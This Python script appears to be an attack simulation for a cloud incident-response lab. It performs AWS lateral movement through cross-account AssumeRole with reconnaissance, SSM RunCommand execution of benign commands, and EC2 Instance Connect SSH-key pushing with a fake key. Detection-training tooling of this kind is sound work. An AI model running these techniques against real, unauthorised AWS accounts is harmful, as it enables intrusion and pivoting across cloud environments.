"""
Lateral Movement Attack Simulation
====================================

MITRE ATT&CK Mapping:
    T1021 - Remote Services (SSM RunCommand, EC2 Instance Connect)
    T1550 - Use Alternate Authentication Material (cross-account AssumeRole)

Techniques:
    1. Cross-account AssumeRole - pivot into roles with permissive trust policies
    2. SSM RunCommand - execute commands on EC2 instances via Systems Manager
    3. EC2 Instance Connect - push SSH public key to an instance

WARNING: For lab use only. All operations target lab-provisioned resources.
"""

import boto3
import argparse
import time
from botocore.exceptions import ClientError


BANNER = """
========================================================
  Lateral Movement - Attack Simulation
========================================================
  MITRE ATT&CK: T1021, T1550
  Techniques:   Cross-account AssumeRole,
                SSM RunCommand, EC2 Instance Connect
========================================================
"""


def timestamp():
    return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())


def cross_account_assume_role(sts, target_role, sleep_time):
    """T1550 - Attempt to pivot into a cross-account role with permissive trust."""
    print(f"\n[{timestamp()}] [T1550] Cross-Account AssumeRole")
    print(f"    [*] Attempting to assume role: {target_role}")

    try:
        resp = sts.assume_role(
            RoleArn=target_role,
            RoleSessionName='lateral-movement-simulation',
            DurationSeconds=900
        )
        creds = resp['Credentials']
        print(f"    [!] SUCCESS - Assumed cross-account role: {target_role}")
        print(f"    [!] AccessKeyId: {creds['AccessKeyId'][:8]}...")
        print(f"    [!] Session expires: {creds['Expiration']}")

        # Enumerate what we can see from the pivoted session
        pivoted = boto3.Session(
            aws_access_key_id=creds['AccessKeyId'],
            aws_secret_access_key=creds['SecretAccessKey'],
            aws_session_token=creds['SessionToken']
        )
        pivoted_sts = pivoted.client('sts')
        identity = pivoted_sts.get_caller_identity()
        print(f"    [!] Pivoted identity: {identity['Arn']}")
        print(f"    [!] Account: {identity['Account']}")

        # Reconnaissance from pivoted session
        print(f"    [*] Performing reconnaissance from pivoted session...")
        pivoted_ec2 = pivoted.client('ec2')
        try:
            instances = pivoted_ec2.describe_instances()
            count = sum(
                len(r['Instances'])
                for r in instances.get('Reservations', [])
            )
            print(f"    [+] Found {count} EC2 instance(s) in target account")
        except ClientError as e:
            print(f"    [-] EC2 recon failed: {e.response['Error']['Code']}")

    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied (Expected - role trust policy is locked down)")
        elif code == 'MalformedPolicyDocument':
            print(f"    [-] Malformed role ARN or trust policy issue")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def ssm_run_command(ssm, instance_id, sleep_time):
    """T1021 - Execute commands on EC2 instances via SSM RunCommand."""
    print(f"\n[{timestamp()}] [T1021] SSM RunCommand")
    print(f"    [*] Target instance: {instance_id}")

    # Verify instance is managed by SSM
    print(f"    [*] Checking SSM managed instances...")
    try:
        info = ssm.describe_instance_information(
            Filters=[{'Key': 'InstanceIds', 'Values': [instance_id]}]
        )
        managed = info.get('InstanceInformationList', [])
        if managed:
            print(f"    [+] Instance {instance_id} is SSM-managed")
            print(f"    [*] Platform: {managed[0].get('PlatformType', 'Unknown')}")
        else:
            print(f"    [-] Instance {instance_id} is not SSM-managed")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied describing instance info (Expected)")
        else:
            print(f"    [-] Failed: {code}")

    # Attempt to send a benign command
    print(f"    [*] Attempting to execute command via SSM RunCommand...")
    try:
        resp = ssm.send_command(
            InstanceIds=[instance_id],
            DocumentName='AWS-RunShellScript',
            Parameters={'commands': ['whoami', 'id', 'hostname']},
            Comment='Lateral movement simulation - Cloud IR Lab'
        )
        command_id = resp['Command']['CommandId']
        print(f"    [!] SUCCESS - Command sent: {command_id}")

        # Wait briefly and check result
        time.sleep(3)
        try:
            output = ssm.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id
            )
            status = output.get('Status', 'Unknown')
            stdout = output.get('StandardOutputContent', '')
            print(f"    [!] Command status: {status}")
            if stdout:
                for line in stdout.strip().split('\n'):
                    print(f"    [!] Output: {line}")
        except ClientError as e:
            print(f"    [-] Could not retrieve command output: {e.response['Error']['Code']}")

    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied sending command (Expected)")
        elif code == 'InvalidInstanceId':
            print(f"    [-] Invalid or unmanaged instance: {instance_id}")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def ec2_instance_connect(ec2ic, instance_id, sleep_time):
    """T1021 - Push an SSH public key to an EC2 instance via EC2 Instance Connect."""
    print(f"\n[{timestamp()}] [T1021] EC2 Instance Connect")
    print(f"    [*] Target instance: {instance_id}")

    # Simulated SSH public key (not a real key - safe for lab)
    simulated_pubkey = (
        'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fakekeyforlab'
        'simulationpurposesonly0000000000000000000000000000000000'
        '000000000000000000000000000000000000000000000000000000='
        ' lab-simulation@cloud-ir-lab'
    )

    print(f"    [*] Attempting to push SSH public key to instance...")
    try:
        ec2ic.send_ssh_public_key(
            InstanceId=instance_id,
            InstanceOSUser='ec2-user',
            SSHPublicKey=simulated_pubkey,
            AvailabilityZone='us-east-1a'
        )
        print(f"    [!] SUCCESS - SSH public key pushed to {instance_id}")
        print(f"    [!] An attacker could now SSH into the instance for ~60 seconds")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied (Expected)")
        elif code == 'EC2InstanceNotFoundException':
            print(f"    [-] Instance not found: {instance_id}")
        elif code == 'EC2InstanceUnavailableException':
            print(f"    [-] Instance unavailable (not running or no agent)")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def simulate(profile, region, target_role, instance_id, sleep_time):
    print(BANNER)
    print(f"[{timestamp()}] Starting Lateral Movement simulation")
    print(f"[{timestamp()}] Profile: {profile} | Region: {region}")

    session = boto3.Session(profile_name=profile, region_name=region)
    sts = session.client('sts')
    ssm = session.client('ssm')

    try:
        identity = sts.get_caller_identity()
        print(f"[{timestamp()}] Identity: {identity['Arn']}")
    except Exception as e:
        print(f"[{timestamp()}] [!] Failed to get identity: {e}")
        return

    # Technique 1: Cross-account AssumeRole
    if target_role:
        cross_account_assume_role(sts, target_role, sleep_time)
    else:
        print(f"\n[{timestamp()}] [*] No --target-role specified, skipping cross-account AssumeRole")

    # Technique 2: SSM RunCommand
    if instance_id:
        ssm_run_command(ssm, instance_id, sleep_time)

        # Technique 3: EC2 Instance Connect
        try:
            ec2ic = session.client('ec2-instance-connect')
            ec2_instance_connect(ec2ic, instance_id, sleep_time)
        except Exception as e:
            print(f"\n[{timestamp()}] [T1021] EC2 Instance Connect")
            print(f"    [-] Could not create EC2 Instance Connect client: {e}")
    else:
        print(f"\n[{timestamp()}] [*] No --instance-id specified, skipping SSM and EC2 Instance Connect")

    print(f"\n[{timestamp()}] Lateral Movement simulation complete")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Lateral Movement attack simulation for Cloud IR Lab'
    )
    parser.add_argument('--profile', required=True, help='AWS CLI profile name')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--target-role',
                        help='Target role ARN for cross-account AssumeRole')
    parser.add_argument('--instance-id',
                        help='Target EC2 instance ID for SSM and Instance Connect')
    parser.add_argument('--sleep', type=float, default=1.0,
                        help='Sleep between actions (seconds)')

    args = parser.parse_args()
    simulate(args.profile, args.region, args.target_role, args.instance_id, args.sleep)
